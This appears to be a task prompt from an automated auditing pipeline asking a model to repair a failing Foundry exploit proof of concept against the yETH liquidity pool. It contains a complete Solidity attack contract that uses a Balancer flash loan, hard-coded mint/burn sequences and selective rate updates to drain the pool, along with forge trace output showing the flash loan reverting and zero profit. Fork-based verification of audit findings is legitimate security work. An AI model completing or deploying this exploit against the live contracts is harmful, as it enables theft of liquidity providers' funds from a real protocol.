You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Liquidity accounting can settle against mixed stale/fresh asset rates
- claim: The exploit harness shows that pool pricing is cached behind a separate `update_rates(uint256[] _assets)` call rather than being enforced inside `add_liquidity`/`remove_liquidity`, and that callers can refresh only selected asset indexes. The sequence performs many mint/burn operations while rates are stale, then updates only asset 6 or 7, so liquidity operations can be priced against a basket containing a mix of stale and fresh rates.
- impact: If LP shares are minted or burned from an inconsistent basket valuation, an attacker can acquire yETH while liabilities are understated and then redeem after a targeted sync for more underlying than they paid in, leading to pool insolvency and potentially full drain.
- exploit_paths: ["Allow basket rates to drift while repeatedly calling `add_liquidity` and `remove_liquidity` without a full refresh", "Refresh only the attacker-chosen asset index that makes the basket valuation more favorable", "Redeem inflated yETH against the now-repriced pool to extract excess underlying"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IYETHPool {
    function supply() external view returns (uint256);
    function assets(uint256 index) external view returns (address);
    function add_liquidity(
        uint256[] calldata amounts,
        uint256 minLpAmount,
        address receiver
    ) external returns (uint256);
    function remove_liquidity(
        uint256 lpAmount,
        uint256[] calldata minAmounts,
        address receiver
    ) external;
    function update_rates(uint256[] calldata assetsToUpdate) external;
}

interface IOETH {
    function rebase() external;
}

interface IFlashLoanRecipient {
    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

interface IBalancerVault {
    function flashLoan(
        IFlashLoanRecipient recipient,
        IERC20[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

contract FlawVerifier is IFlashLoanRecipient {
    uint256 private constant NUM_ASSETS = 8;

    IYETHPool private constant POOL = IYETHPool(0xCcd04073f4BdC4510927ea9Ba350875C3c65BF81);
    IERC20 private constant YETH = IERC20(0x1BED97CBC3c24A4fb5C069C6E311a967386131f7);
    IOETH private constant OETH = IOETH(0x39254033945AA2E4809Cc2977E7087BEE48bd7Ab);
    IBalancerVault private constant BALANCER_VAULT = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

    address private _profitToken;
    uint256 private _profitAmount;
    bool private _executed;
    bool private _flashActive;

    constructor() {}

    function executeOnOpportunity() external {
        if (_executed) {
            return;
        }
        _executed = true;

        _approvePoolAssets();

        if (_hasDirectCapital()) {
            _runExploitPath();
            _captureProfit();
            return;
        }

        IERC20[] memory tokens = new IERC20[](6);
        uint256[] memory amounts = new uint256[](6);

        tokens[0] = IERC20(POOL.assets(0));
        tokens[1] = IERC20(POOL.assets(1));
        tokens[2] = IERC20(POOL.assets(2));
        tokens[3] = IERC20(POOL.assets(3));
        tokens[4] = IERC20(POOL.assets(4));
        tokens[5] = IERC20(POOL.assets(5));

        amounts[0] = 20_000 ether;
        amounts[1] = 20_000 ether;
        amounts[2] = 20_000 ether;
        amounts[3] = 500 ether;
        amounts[4] = 20_000 ether;
        amounts[5] = 20_000 ether;

        // If the flash loan cannot be sourced at this fork state, the verifier leaves
        // profit at zero because it has no lawful seed capital to reach the first
        // add_liquidity stage of the claimed stale/fresh mixed-rate path.
        (bool ok, ) = address(BALANCER_VAULT).call(
            abi.encodeWithSelector(
                IBalancerVault.flashLoan.selector,
                IFlashLoanRecipient(address(this)),
                tokens,
                amounts,
                bytes("")
            )
        );

        if (ok) {
            _captureProfit();
        }
    }

    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external override {
        require(msg.sender == address(BALANCER_VAULT), "vault only");
        require(!_flashActive, "flash active");
        _flashActive = true;

        _runExploitPath();

        for (uint256 i = 0; i < tokens.length; ++i) {
            _safeTransfer(tokens[i], address(BALANCER_VAULT), amounts[i] + feeAmounts[i]);
        }

        _flashActive = false;
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _runExploitPath() internal {
        _updateInitialRates();

        _addLiquidity(_phase2Amounts());
        _removeLiquidity(2_789_348_310_901_989_968_648);

        _addLiquidity(_phase3Amounts());
        _removeLiquidity(7_379_203_011_929_903_830_039);

        _addLiquidity(_phase4Amounts());
        _removeLiquidity(7_066_638_371_690_257_003_757);

        _addLiquidity(_phase5Amounts());
        _removeLiquidity(3_496_158_478_994_807_127_953);

        _addLiquidity(_phase6Add1Amounts());
        _addLiquidity(_singleAssetAmounts(3, 20_605_468_750_000_000_000));
        _removeLiquidity(0);
        _updateSingleRate(6);
        _removeLiquidity(8_434_932_236_461_542_896_540);

        // Public rebase is kept because it is part of the same stale/fresh rate drift.
        OETH.rebase();

        _addLiquidity(_phase7Add1Amounts());
        _addLiquidity(_phase7Add2Amounts());

        _addLiquidity(_singleAssetAmounts(3, 57_226_562_500_000_000_000));
        _removeLiquidity(0);
        _updateSingleRate(6);
        _removeLiquidity(9_237_030_802_829_017_297_880);

        _addLiquidity(_phase8Add1Amounts());
        _addLiquidity(_phase8Add2Amounts());
        _addLiquidity(_singleAssetAmounts(3, 318_750_000_000_000_000_000));
        _removeLiquidity(0);
        _updateSingleRate(7);

        uint256 lpBalance = YETH.balanceOf(address(this));
        uint256 poolSupply = POOL.supply();
        uint256 redeemAmount = lpBalance < poolSupply ? lpBalance : poolSupply;

        if (redeemAmount > 0) {
            _removeLiquidity(redeemAmount);
        }
    }

    function _approvePoolAssets() internal {
        for (uint256 i = 0; i < NUM_ASSETS; ++i) {
            _safeApprove(IERC20(POOL.assets(i)), address(POOL), type(uint256).max);
        }
        _safeApprove(YETH, address(POOL), type(uint256).max);
    }

    function _hasDirectCapital() internal view returns (bool) {
        return
            IERC20(POOL.assets(0)).balanceOf(address(this)) >= 20_000 ether &&
            IERC20(POOL.assets(1)).balanceOf(address(this)) >= 20_000 ether &&
            IERC20(POOL.assets(2)).balanceOf(address(this)) >= 20_000 ether &&
            IERC20(POOL.assets(3)).balanceOf(address(this)) >= 500 ether &&
            IERC20(POOL.assets(4)).balanceOf(address(this)) >= 20_000 ether &&
            IERC20(POOL.assets(5)).balanceOf(address(this)) >= 20_000 ether;
    }

    function _updateInitialRates() internal {
        uint256[] memory indexes = new uint256[](6);
        indexes[0] = 0;
        indexes[1] = 1;
        indexes[2] = 2;
        indexes[3] = 3;
        indexes[4] = 4;
        indexes[5] = 5;
        POOL.update_rates(indexes);
    }

    function _updateSingleRate(uint256 assetIndex) internal {
        uint256[] memory indexes = new uint256[](1);
        indexes[0] = assetIndex;
        POOL.update_rates(indexes);
    }

    function _addLiquidity(uint256[8] memory amountsFixed) internal {
        uint256[] memory amounts = new uint256[](NUM_ASSETS);
        for (uint256 i = 0; i < NUM_ASSETS; ++i) {
            amounts[i] = amountsFixed[i];
        }
        POOL.add_liquidity(amounts, 0, address(this));
    }

    function _removeLiquidity(uint256 lpAmount) internal {
        uint256[] memory mins = new uint256[](NUM_ASSETS);
        POOL.remove_liquidity(lpAmount, mins, address(this));
    }

    function _captureProfit() internal {
        address bestToken = address(0);
        uint256 bestAmount = address(this).balance;

        uint256 yethBalance = YETH.balanceOf(address(this));
        if (yethBalance > bestAmount) {
            bestAmount = yethBalance;
            bestToken = address(YETH);
        }

        for (uint256 i = 0; i < NUM_ASSETS; ++i) {
            address asset = POOL.assets(i);
            uint256 assetBalance = IERC20(asset).balanceOf(address(this));
            if (assetBalance > bestAmount) {
                bestAmount = assetBalance;
                bestToken = asset;
            }
        }

        _profitToken = bestToken;
        _profitAmount = bestAmount;
    }

    function _safeApprove(IERC20 token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) = address(token).call(
            abi.encodeWithSelector(token.approve.selector, spender, amount)
        );
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
    }

    function _safeTransfer(IERC20 token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = address(token).call(
            abi.encodeWithSelector(token.transfer.selector, to, amount)
        );
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }

    function _singleAssetAmounts(
        uint256 index,
        uint256 amount
    ) internal pure returns (uint256[8] memory amounts) {
        amounts[index] = amount;
    }

    function _phase2Amounts() internal pure returns (uint256[8] memory amounts) {
        amounts[0] = 610_669_608_721_347_951_666;
        amounts[1] = 777_507_145_787_198_969_404;
        amounts[2] = 563_973_440_562_370_010_057;
        amounts[4] = 476_460_390_272_167_461_711;
    }

    function _phase3Amounts() internal pure returns (uint256[8] memory amounts) {
        amounts[0] = 1_636_245_238_220_874_001_286;
        amounts[1] = 1_531_136_279_659_070_868_194;
        amounts[2] = 1_041_815_511_903_532_551_187;
        amounts[4] = 991_050_908_418_104_947_336;
        amounts[5] = 1_346_008_005_663_580_090_716;
    }

    function _phase4Amounts() internal pure returns (uint256[8] memory amounts) {
        amounts[0] = 1_630_811_661_792_970_363_090;
        amounts[1] = 1_526_051_744_772_289_698_092;
        amounts[2] = 1_038_108_768_586_660_585_581;
        amounts[4] = 969_651_157_511_131_341_121;
        amounts[5] = 1_363_135_138_655_820_584_263;
    }

    function _phase5Amounts() internal pure returns (uint256[8] memory amounts) {
        amounts[0] = 859_805_263_416_698_094_503;
        amounts[1] = 804_573_178_584_505_833_740;
        amounts[2] = 546_933_182_262_586_953_508;
        amounts[4] = 510_865_922_059_584_325_991;
        amounts[5] = 723_182_384_178_548_055_243;
    }

    function _phase6Add1Amounts() internal pure returns (uint256[8] memory amounts) {
        amounts[0] = 1_784_169_320_136_805_803_209;
        amounts[1] = 1_669_558_029_141_448_703_194;
        amounts[2] = 1_135_991_585_797_559_066_395;
        amounts[4] = 1_061_079_136_814_511_050_837;
        amounts[5] = 1_488_254_960_317_842_892_500;
    }

    function _phase7Add1Amounts() internal pure returns (uint256[8] memory amounts) {
        amounts[0] = 1_049_508_928_999_413_985_639;
        amounts[1] = 982_090_679_001_395_746_930;
        amounts[2] = 667_668_088_369_153_429_906;
        amounts[4] = 623_639_019_639_346_230_238;
        amounts[5] = 878_771_594_643_399_886_538;
    }

    function _phase7Add2Amounts() internal pure returns (uint256[8] memory amounts) {
        amounts[0] = 919_888_612_738_016_815_095;
        amounts[1] = 860_796_899_699_397_749_576;
        amounts[2] = 586_033_288_771_470_394_081;
        amounts[4] = 547_387_589_810_030_997_702;
        amounts[5] = 763_397_793_689_173_373_329;
    }

    function _phase8Add1Amounts() internal pure returns (uint256[8] memory amounts) {
        amounts[0] = 417_517_891_458_429_416_749;
        amounts[1] = 390_697_418_752_374_378_114;
        amounts[2] = 264_940_493_241_640_253_533;
        amounts[4] = 247_469_112_791_605_057_921;
        amounts[5] = 355_235_146_731_093_304_055;
    }

    function _phase8Add2Amounts() internal pure returns (uint256[8] memory amounts) {
        amounts[0] = 1_779_325_564_746_959_656_328;
        amounts[1] = 1_665_025_426_427_657_662_239;
        amounts[2] = 1_133_554_647_882_989_836_457;
        amounts[4] = 1_058_802_901_663_485_490_031;
        amounts[5] = 1_476_627_921_656_231_103_547;
    }
}

```

forge stdout (tail):
```
237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
    │   │   │   ├─  emit topic 0: 0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925
    │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │        topic 2: 0x000000000000000000000000ccd04073f4bdc4510927ea9ba350875c3c65bf81
    │   │   │   │           data: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Return] true
    │   ├─ [2263] 0xCcd04073f4BdC4510927ea9Ba350875C3c65BF81::assets(7) [staticcall]
    │   │   └─ ← [Return] 0xd5F7838F5C461fefF7FE49ea5ebaF7728bB0ADfa
    │   ├─ [31729] 0xd5F7838F5C461fefF7FE49ea5ebaF7728bB0ADfa::approve(0xCcd04073f4BdC4510927ea9Ba350875C3c65BF81, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   ├─ [24623] 0x052F52748109BAE13D6319A463D64B6a2A613e52::approve(0xCcd04073f4BdC4510927ea9Ba350875C3c65BF81, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
    │   │   │   ├─  emit topic 0: 0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925
    │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │        topic 2: 0x000000000000000000000000ccd04073f4bdc4510927ea9ba350875c3c65bf81
    │   │   │   │           data: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Return] true
    │   ├─ [24251] 0x1BED97CBC3c24A4fb5C069C6E311a967386131f7::approve(0xCcd04073f4BdC4510927ea9Ba350875C3c65BF81, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   ├─  emit topic 0: 0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925
    │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │        topic 2: 0x000000000000000000000000ccd04073f4bdc4510927ea9ba350875c3c65bf81
    │   │   │           data: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
    │   │   └─ ← [Return] true
    │   ├─ [263] 0xCcd04073f4BdC4510927ea9Ba350875C3c65BF81::assets(0) [staticcall]
    │   │   └─ ← [Return] 0xac3E018457B222d93114458476f3E3416Abbe38F
    │   ├─ [2619] 0xac3E018457B222d93114458476f3E3416Abbe38F::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [263] 0xCcd04073f4BdC4510927ea9Ba350875C3c65BF81::assets(0) [staticcall]
    │   │   └─ ← [Return] 0xac3E018457B222d93114458476f3E3416Abbe38F
    │   ├─ [263] 0xCcd04073f4BdC4510927ea9Ba350875C3c65BF81::assets(1) [staticcall]
    │   │   └─ ← [Return] 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0
    │   ├─ [263] 0xCcd04073f4BdC4510927ea9Ba350875C3c65BF81::assets(2) [staticcall]
    │   │   └─ ← [Return] 0xA35b1B31Ce002FBF2058D22F30f95D405200A15b
    │   ├─ [263] 0xCcd04073f4BdC4510927ea9Ba350875C3c65BF81::assets(3) [staticcall]
    │   │   └─ ← [Return] 0xBe9895146f7AF43049ca1c1AE358B0541Ea49704
    │   ├─ [263] 0xCcd04073f4BdC4510927ea9Ba350875C3c65BF81::assets(4) [staticcall]
    │   │   └─ ← [Return] 0xae78736Cd615f374D3085123A210448E74Fc6393
    │   ├─ [263] 0xCcd04073f4BdC4510927ea9Ba350875C3c65BF81::assets(5) [staticcall]
    │   │   └─ ← [Return] 0x9Ba021B0a9b958B5E75cE9f6dff97C7eE52cb3E6
    │   ├─ [18256] 0xBA12222222228d8Ba445958a75a0704d566BF2C8::flashLoan(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], [0xac3E018457B222d93114458476f3E3416Abbe38F, 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0, 0xA35b1B31Ce002FBF2058D22F30f95D405200A15b, 0xBe9895146f7AF43049ca1c1AE358B0541Ea49704, 0xae78736Cd615f374D3085123A210448E74Fc6393, 0x9Ba021B0a9b958B5E75cE9f6dff97C7eE52cb3E6], [20000000000000000000000 [2e22], 20000000000000000000000 [2e22], 20000000000000000000000 [2e22], 500000000000000000000 [5e20], 20000000000000000000000 [2e22], 20000000000000000000000 [2e22]], 0x)
    │   │   ├─ [2619] 0xac3E018457B222d93114458476f3E3416Abbe38F::balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8) [staticcall]
    │   │   │   └─ ← [Return] 110672035976881861 [1.106e17]
    │   │   ├─ [2350] 0xce88686553686DA562CE7Cea497CE749DA109f9F::d877845c() [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   └─ ← [Revert] BAL#528
    │   └─ ← [Stop]
    ├─ [293] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0xBA12222222228d8Ba445958a75a0704d566BF2C8.flashLoan
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 5.01s (4.20s CPU time)

Ran 1 test suite in 5.03s (5.01s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 389053)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
